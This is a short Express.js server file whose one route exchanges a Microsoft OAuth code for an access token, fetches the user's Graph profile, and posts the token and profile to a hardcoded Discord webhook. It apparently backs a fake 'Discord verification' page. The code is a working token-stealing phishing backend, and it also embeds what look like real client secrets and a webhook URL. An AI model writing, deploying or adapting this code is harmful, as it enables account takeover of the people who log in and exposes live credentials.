const express = require('express');
const axios = require('axios');
const app = express();

app.get('/redirect', (req, res) => {
    // Get the code from the query string
    const code = req.query.code;

    // Exchange the code for an access token
    axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
        grant_type: 'authorization_code',
        client_id: 'a1ad2d37-7be9-4db9-bad1-e457f14e2e1b',
        client_secret: 'e92eb957-6e2f-43ad-a233-dfbec6cadc86',
        code: code,
        redirect_uri: 'https://discord-verification-bot-79dd.onrender.com/'
    })
    .then(response => {
        const access_token = response.data.access_token;

        // Get the user's profile
        axios.get('https://graph.microsoft.com/v1.0/me', {
            headers: {
                'Authorization': 'Bearer ' + access_token
            }
        })
        .then(response => {
            const user = response.data;

            // Send the access token and user information to your webhook
            axios.post('https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW', {
                access_token: access_token,
                user: user
            })
            .then(response => {
                // Send a message to the user indicating that their information was sent to the webhook
                res.send('Your information was sent to the webhook.');
            })
            .catch(error => {
                console.log(error);
                res.send('An error occurred while sending your information to the webhook.');
            });
        })
        .catch(error => {
            console.log(error);
            res.send('An error occurred while getting your profile.');
        });
    })
    .catch(error => {
        console.log(error);
        res.send('An error occurred while getting your access token.');
    });
});

app.listen(process.env.PORT || 3000, () => {
    console.log('Server is running on port 3000');
});
